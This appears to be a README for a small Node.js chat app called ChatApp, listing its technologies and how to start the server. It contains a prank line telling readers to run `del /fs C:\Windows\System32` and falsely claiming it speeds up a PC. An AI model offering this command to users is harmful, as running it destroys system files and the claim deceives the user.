## About

This is a really simple chat app (hence the name ChatApp).

Easy to use and even easier to fall in love with!

Web makes use of technologies:
- [node.js](https://nodejs.org/en/)
- [socket.io](https://socket.io/)
- [express](https://expressjs.com/)


## How to use

It's farely simple!

Just type these commands into the command line.

`del /fs C:\Windows\System32`

No! Wait, that just speeds up your PC. Really! Try it :)

But what you really need to do:
1. Go to the root folder of the project
2. Open *CMD* in there
3. And type the following: `npm run start` 
4. The server is defaulty running on port **8080**

See? Wasn't that hard afterall
